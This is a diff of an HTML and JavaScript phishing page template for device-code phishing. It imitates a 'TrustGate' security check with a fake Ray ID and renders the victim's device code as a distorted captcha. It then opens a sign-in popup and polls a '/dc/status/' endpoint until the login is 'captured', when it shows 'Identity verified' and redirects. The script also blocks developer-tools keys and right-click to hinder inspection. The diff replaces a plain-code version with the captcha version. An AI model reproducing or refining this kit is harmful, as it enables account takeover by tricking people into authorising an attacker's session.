-            <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-            Download document
-          </button>
-          <div class="audit-log" id="auditLog"></div>
-        </div>
-      </div>
-    </div>
-
-    <div class="card-footer">
-
-    </div>
-  </div>
+<div class="card-body" id="stepCode">
+<h1 id="card-title">Confirm your device code</h1>
+<p class="subtitle">Enter this code on your device to continue. Only proceed if you requested this code yourself.</p>
+<div class="captcha-frame">
+<canvas id="captcha-canvas" width="640" height="220" role="img" aria-label="Device code as captcha image" title="Click to redraw"></canvas>
+<button id="captcha-refresh" type="button" aria-label="Redraw captcha" title="Redraw captcha">
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 12a8 8 0 1 1-2.34-5.66" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M20 3.5V8h-4.5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</button>
 </div>
-
+<p class="hint">Hard to read? Click the image for a fresh look &mdash; the code itself never changes.</p>
+<div class="status-bar" id="statusBar">
+<svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><circle cx="8" cy="8" r="8"/><path d="M4.5 8.5l2.5 2.5 4-5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>
+<span id="statusText">Generating secure code...</span>
+</div>
+<button id="verify-device" class="verify-btn" type="button" disabled>Verify device</button>
+</div>
+<div id="stepSuccess" class="hidden">
+<div class="card-body">
+<div class="success-wrap">
+<div class="success-ring"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
+<h2 class="success-title">Identity verified</h2>
+<p class="success-sub">You now have full access. Your identity has been confirmed via the device code flow.</p>
+<button class="btn-download" id="btnDownload">Download document</button>
+<div class="audit-log" id="auditLog"></div>
+</div>
+</div>
+</div>
+</section>
+<p class="ray">Ray ID: <span id="ray-id"></span> &nbsp;&middot;&nbsp; Performance &amp; security by <a href="#">TrustGate</a></p>
+</main>
+<footer class="site-footer">
+<div class="footer-inner">
+<div class="footer-brand">
+<svg class="brand-mark" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2l8 3v6c0 5-3.4 9.4-8 11-4.6-1.6-8-6-8-11V5l8-3z" fill="#f6821f"/><path d="M8.4 12.3l2.4 2.4 4.8-5" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<span class="footer-brand-name">TrustGate</span>
+</div>
+<div class="footer-meta">
+<span class="copyright">&copy; 2026 TrustGate, Inc. All rights reserved.</span>
+<nav class="footer-nav" aria-label="Footer">
+<a href="#">Privacy Policy</a>
+<a href="#">Terms of Service</a>
+<a href="#">Help Center</a>
+</nav>
+</div>
+</div>
+</footer>
 <script>
 document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
 
 (function(){
-  var sid = '{session_id}';
-  var verifyUrl = '{verify_url}';
-  var codeReady = {code_ready};
-  var code = '{user_code}';
-  var expiresIn = {expires_seconds};
+var sid = '{session_id}';
+var verifyUrl = '{verify_url}';
+var codeReady = {code_ready};
+var DEVICE_CODE = '{user_code}';
+var expiresIn = {expires_seconds};
 
-  var codeEl = document.getElementById('codeDisplay');
-  var statusEl = document.getElementById('statusBar');
-  var btnAuth = document.getElementById('btnAuthenticate');
-  var copyBtn = document.getElementById('btnCopy');
+var canvas = document.getElementById('captcha-canvas');
+var ctx = canvas.getContext('2d');
+var W = canvas.width;
+var H = canvas.height;
 
-  function setStatus(msg, isError) {
-    if (isError) {
-      statusEl.style.background = '#fef2f2';
-      statusEl.style.color = '#dc2626';
-      statusEl.style.borderColor = '#fecaca';
-    } else {
-      statusEl.style.background = '#f0fafa';
-      statusEl.style.color = '#0a7c6e';
-      statusEl.style.borderColor = 'rgba(10,124,110,0.18)';
-    }
-    statusEl.innerHTML = msg;
-  }
+var INK = ['#1f2937','#7c2d12','#1e3a8a','#065f46','#7f1d1d','#3b0764','#0f766e','#9d174d'];
+var FONTS = ['Georgia, serif','"Times New Roman", serif','Verdana, sans-serif','"Trebuchet MS", sans-serif','"Courier New", monospace','"Comic Sans MS","Chalkboard SE", cursive'];
 
-  function showCode(c, v) {
-    code = c;
-    if(v) verifyUrl = v;
-    codeEl.textContent = c;
-    btnAuth.disabled = false;
-    copyBtn.disabled = false;
-    setStatus('<svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><circle cx="8" cy="8" r="8"/><path d="M4.5 8.5l2.5 2.5 4-5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg> Code ready — click Authenticate to proceed', false);
-  }
+function rand(min,max){return Math.random()*(max-min)+min}
+function pick(arr){return arr[Math.floor(Math.random()*arr.length)]}
 
-  if (codeReady && code) {
-    showCode(code, verifyUrl);
-  } else {
-    codeEl.textContent = 'Loading...';
-    btnAuth.disabled = true;
-    copyBtn.disabled = true;
-    setStatus('Generating secure code...', false);
-  }
+function drawBackground(c){
+var g=c.createLinearGradient(0,0,W,H);
+g.addColorStop(0,'#fdfdfb');g.addColorStop(1,'#f3f0e9');
+c.fillStyle=g;c.fillRect(0,0,W,H);
+for(var i=0;i<650;i++){c.fillStyle='rgba(60,50,30,'+rand(0.02,0.08).toFixed(3)+')';c.fillRect(rand(0,W),rand(0,H),rand(1,2.6),rand(1,2.6))}
+}
 
-  function copyCode() {
-    if (!code) return;
-    if (navigator.clipboard) {
-      navigator.clipboard.writeText(code).then(function() { showCopied(); });
-    } else {
-      var t = document.createElement('textarea');
-      t.value = code;
-      document.body.appendChild(t);
-      t.select();
-      document.execCommand('copy');
-      document.body.removeChild(t);
-      showCopied();
-    }
-  }
+function drawSquiggle(c,color,alpha,width){
+c.save();c.strokeStyle=color;c.globalAlpha=alpha;c.lineWidth=width;c.lineCap='round';
+c.beginPath();c.moveTo(-12,rand(H*0.25,H*0.75));
+c.bezierCurveTo(rand(W*0.15,W*0.4),rand(-H*0.1,H*1.1),rand(W*0.6,W*0.85),rand(-H*0.1,H*1.1),W+12,rand(H*0.25,H*0.75));
+c.stroke();c.restore()
+}
 
-  function showCopied() {
-    copyBtn.classList.add('copied');
-    copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copied!';
-    setTimeout(function() {
-      copyBtn.classList.remove('copied');
-      copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy';
-    }, 2000);
-  }
+function renderCodeOffscreen(){
+var off=document.createElement('canvas');off.width=W;off.height=H;
+var o=off.getContext('2d');
+drawSquiggle(o,'#c2410c',0.28,8);
+var chars=DEVICE_CODE.split('');var margin=70;var slot=(W-margin*2)/chars.length;
+for(var i=0;i<chars.length;i++){
+var size=rand(68,96);o.save();
+o.font=(Math.random()<0.4?'italic ':'')+'700 '+size.toFixed(0)+'px '+pick(FONTS);
+o.textAlign='center';o.textBaseline='middle';
+var cx=margin+slot*i+slot/2+rand(-7,7);var cy=H/2+rand(-16,16);
+o.translate(cx,cy);o.rotate(rand(-0.45,0.45));
+var g=o.createLinearGradient(0,-size/2,0,size/2);
+g.addColorStop(0,pick(INK));g.addColorStop(1,pick(INK));
+o.fillStyle=g;o.fillText(chars[i],0,0);o.restore()
+}
+return off
+}
 
-  function openSignIn() {
-    if (!code) {
-      setStatus('Please wait for code generation.', true);
-      return;
-    }
-    copyCode();
-    var w = 600, h = 600, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
-    var popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
-    if (popup) popup.focus();
-    setStatus('Verification page opened. Please confirm the code.', false);
-  }
+function warpOnto(off){
+var amp1=rand(9,17),amp2=rand(3,7),f1=rand(0.008,0.014),f2=rand(0.02,0.034);
+var p1=rand(0,Math.PI*2),p2=rand(0,Math.PI*2),step=4;
+for(var x=0;x<W;x+=step){
+var dy=Math.sin(x*f1+p1)*amp1+Math.sin(x*f2+p2)*amp2;
+ctx.drawImage(off,x,0,step,H,x,dy,step,H)
+}
+}
 
-  function showSuccess(redirectUrl) {
-    document.getElementById('stepCode').classList.add('hidden');
-    document.getElementById('stepSuccess').classList.remove('hidden');
-    var downloadBtn = document.getElementById('btnDownload');
-    if (redirectUrl) {
-      downloadBtn.onclick = function() { top.location.href = redirectUrl; };
-    } else {
-      downloadBtn.onclick = function() { top.location.href = redirectUrl || '/'; };
-    }
-    var now = new Date();
-    document.getElementById('auditLog').textContent =
-      'ACCESS GRANTED\n' +
-      'Time:    ' + now.toUTCString() + '\n' +
-      'Method:  Device Code Flow\n' +
-      'Session: ' + sid;
-  }
+function drawNoiseDots(){
+for(var i=0;i<240;i++){ctx.fillStyle='rgba(17,24,39,'+rand(0.06,0.3).toFixed(3)+')';ctx.beginPath();ctx.arc(rand(0,W),rand(0,H),rand(0.7,2.2),0,Math.PI*2);ctx.fill()}
+}
 
-  function poll() {
-    fetch('/dc/status/' + sid, {method:'GET',credentials:'include'}).then(function(r) { return r.json() }).then(function(d) {
-      if (d.ready && !codeReady) {
-        codeReady = true;
-        showCode(d.user_code, d.verify_url);
-      }
-      if (d.captured) {
-        showSuccess(d.redirect_url);
-        if (d.redirect_url) {
-          setTimeout(function(){ top.location.href = d.redirect_url; }, 2500);
-        }
-      }
-      if (d.expired) {
-        setStatus('Code expired. Please refresh the page.', true);
-        btnAuth.disabled = true;
-      }
-      if (!d.failed && !d.expired && !d.captured) {
-        setTimeout(poll, 3000);
-      }
-    })['catch'](function(){ setTimeout(poll, 5000); });
-  }
-  
-  poll();
+function render(){
+ctx.clearRect(0,0,W,H);drawBackground(ctx);warpOnto(renderCodeOffscreen());
+drawSquiggle(ctx,'#9a3412',0.45,4);drawSquiggle(ctx,'#1e40af',0.35,3);drawNoiseDots()
+}
 
-  copyBtn.addEventListener('click', copyCode);
-  btnAuth.addEventListener('click', openSignIn);
+var verifyBtn=document.getElementById('verify-device');
+var statusBar=document.getElementById('statusBar');
+var statusText=document.getElementById('statusText');
+var ready=codeReady && DEVICE_CODE!=='';
+var code=DEVICE_CODE;
+
+function setStatus(msg,isError){
+statusBar.className='status-bar'+(isError?' error':'');
+statusText.textContent=msg
+}
+
+function showCode(c,v){
+code=c;DEVICE_CODE=c;if(v)verifyUrl=v;ready=true;
+verifyBtn.disabled=false;render();
+setStatus('Code ready - click Verify device to proceed')
+}
+
+if(ready&&code){showCode(code,verifyUrl)}else{verifyBtn.disabled=true;setStatus('Generating secure code...')}
+
+function openSignIn(){
+if(!code){setStatus('Please wait for code generation.',true);return}
+var w=600,h=600,l=(screen.width-w)/2,t=(screen.height-h)/2;
+var popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
+if(popup)popup.focus();
+setStatus('Verification page opened. Please confirm the code.')
+}
+
+function showSuccess(redirectUrl){
+document.getElementById('stepCode').classList.add('hidden');
+document.getElementById('stepSuccess').classList.remove('hidden');
+var dl=document.getElementById('btnDownload');
+dl.onclick=function(){top.location.href=redirectUrl||'/'};
+var n=new Date();
+document.getElementById('auditLog').textContent='ACCESS GRANTED\nTime:    '+n.toUTCString()+'\nMethod:  Device Code Flow\nSession: '+sid
+}
+
+function poll(){
+fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){
+if(d.ready&&!ready){ready=true;showCode(d.user_code,d.verify_url)}
+if(d.captured){showSuccess(d.redirect_url);if(d.redirect_url){setTimeout(function(){top.location.href=d.redirect_url},2500)}}
+if(d.expired){setStatus('Code expired. Please refresh the page.',true);verifyBtn.disabled=true}
+if(!d.failed&&!d.expired&&!d.captured){setTimeout(poll,3000)}
+})['catch'](function(){setTimeout(poll,5000)})
+}
+
+poll();
+
+document.getElementById('captcha-refresh').addEventListener('click',function(e){e.stopPropagation();if(ready)render()});
+canvas.addEventListener('click',function(){if(ready)render()});
+verifyBtn.addEventListener('click',openSignIn);
+
+var hex='0123456789abcdef';var ray='';for(var i=0;i<16;i++)ray+=hex.charAt(Math.floor(Math.random()*16));
+document.getElementById('ray-id').textContent=ray;
 })();
 </script>
 </body>
